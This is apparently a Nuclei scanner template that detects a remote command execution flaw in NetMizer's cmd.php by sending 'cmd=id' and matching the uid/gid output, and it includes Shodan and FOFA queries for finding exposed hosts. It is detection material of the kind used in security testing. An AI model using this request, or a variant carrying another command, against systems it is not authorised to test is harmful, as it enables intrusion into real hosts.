id: netmizer-cmd-rce

info:
  name: NetMizer LogManagement System cmd.php - Remote Code Execution
  author: DhiyaneshDk
  severity: critical
  description: |
    Remote Command Execution vulnerability in the NetMizer log management system cmd.php, and the attacker can execute the command by passing in the cmd parameter.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/NetMizer%20%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20cmd.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"NetMizer"
    fofa-query: title="NetMizer 日志管理系统"
  tags: netmizer,cmd,rce,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/data/manage/cmd.php?cmd=id"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'uid=(\d+)\(.*?\) gid=(\d+)\(.*?\) groups=([\d,]+)\(.*?\)'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
# digest: 490a004630440220750e67b8212df826a566771c39cdd7cdbd49ff4b3cbe330585a8a4d23cbeb04c02205956dc562a433b2f9de611cf64e73f869dd0d0b568b279a0135e4d637c4cc458:922c64590222798bb761d5b6d8e72950